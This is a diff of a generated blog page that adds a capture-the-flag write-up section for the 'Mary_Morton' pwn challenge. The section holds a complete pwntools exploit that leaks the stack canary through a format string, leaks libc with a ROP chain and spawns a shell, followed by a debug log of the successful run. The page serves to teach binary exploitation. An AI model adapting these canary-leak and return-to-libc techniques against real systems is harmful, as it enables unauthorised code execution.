@@ -399,14 +399,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        949
+                        1.3k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        4 分
+                        6 分
                     </div>
                     
                 
@@ -570,6 +570,103 @@ payload2 <span class="token operator">=</span> <span class="token string">'A'</s
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
 
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
+<h2 id="5-EXP无后门版"><a href="#5-EXP无后门版" class="headerlink" title="5:EXP无后门版"></a>5:EXP无后门版</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'Mary_Morton'</span><span class="token punctuation">)</span>
+system_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>
+puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+bss_addr <span class="token operator">=</span> <span class="token number">0x0601080</span>
+door <span class="token operator">=</span> <span class="token number">0x004008DA</span>
+pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0400ab3</span>
+<span class="token comment" spellcheck="true">#main : 0x0400826</span>
+<span class="token comment" spellcheck="true">#RDI, RSI, RDX, RCX, R8 R9</span>
+<span class="token comment" spellcheck="true">#0x0000000000400659 : ret</span>
+<span class="token comment" spellcheck="true">#0x0400B2B cat</span>
+<span class="token comment" spellcheck="true">#0400ab3 : pop rdi ; ret</span>
+<span class="token comment" spellcheck="true">#0400960 overflow</span>
+
+sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./Mary_Morton'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#sh = remote('220.249.52.133',40551)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">"#############leaking the cookie#################"</span>
+payload <span class="token operator">=</span> <span class="token string">'%23$pAAA'</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
+cookie <span class="token operator">=</span> int<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> cookie
+
+
+<span class="token keyword">print</span> <span class="token string">"#############leaking the puts_addr#################"</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span><span class="token string">'AAAAAAAA'</span> 
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#payload += p64(pop_rdi_ret) + p64(0x0400B2B) + p64(system_plt)</span>
+payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0400826</span><span class="token punctuation">)</span> 
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
+tmp <span class="token operator">=</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x00'</span> <span class="token operator">+</span> <span class="token string">'\x00'</span>
+puts_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">"puts_addr==>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts_addr<span class="token punctuation">)</span>
+libc_addr <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> <span class="token string">"libc_addr==>"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>libc_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>
+binsh_addr <span class="token operator">=</span> libc_addr<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(sh)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span> <span class="token string">"#############final attack#################"</span>
+payload2 <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">136</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>cookie<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'AAAAAAAA'</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000000000400659</span><span class="token punctuation">)</span>
+payload2 <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>
+
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+
+
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+结果：
+Welcome to the battle ! 
+<span class="token punctuation">[</span>Great Fairy<span class="token punctuation">]</span> level pwned 
+Select your weapon 
+<span class="token number">1</span><span class="token punctuation">.</span> Stack Bufferoverflow Bug 
+<span class="token number">2</span><span class="token punctuation">.</span> Format String Bug 
+<span class="token number">3</span><span class="token punctuation">.</span> Exit the battle 
+
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x2</span> bytes<span class="token punctuation">:</span>
+    <span class="token string">'1\n'</span>
+<span class="token comment" spellcheck="true">#############final attack#################</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0xb9</span> bytes<span class="token punctuation">:</span>
+    <span class="token number">00000000</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  │AAAA│AAAA│AAAA│AAAA│
+    <span class="token operator">*</span>
+    <span class="token number">00000080</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">00</span> d0 eb ef  e0 eb d0 <span class="token number">4c</span>  │AAAA│AAAA│····│···L│
+    <span class="token number">00000090</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>  <span class="token number">59</span> <span class="token number">06</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  │AAAA│AAAA│Y·@·│····│
+    <span class="token number">000000a0</span>  b3 <span class="token number">0a</span> <span class="token number">40</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">9a</span> <span class="token number">4e</span> <span class="token number">3a</span> <span class="token number">79</span>  <span class="token number">16</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  │··@·│····│·N<span class="token punctuation">:</span>y│····│
+    <span class="token number">000000b0</span>  <span class="token number">40</span> <span class="token number">04</span> <span class="token number">24</span> <span class="token number">79</span>  <span class="token number">16</span> <span class="token number">7f</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">0a</span>                        │@·$y│····│·│
+    <span class="token number">000000b9</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x8c</span> bytes<span class="token punctuation">:</span>
+    <span class="token string">'-> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n'</span>
+<span class="token operator">-</span><span class="token operator">></span> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+$ whoami
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Sent <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>
+    <span class="token string">'whoami\n'</span>
+<span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received <span class="token number">0x7</span> bytes<span class="token punctuation">:</span>
+    <span class="token string">'hunter\n'</span>
+hunter
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive
+$  
+</code></pre>
 
             </div>
             <hr/>
@@ -916,7 +1013,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">32.3k</span>
+                <span class="white-color">32.7k</span>
             
 
             
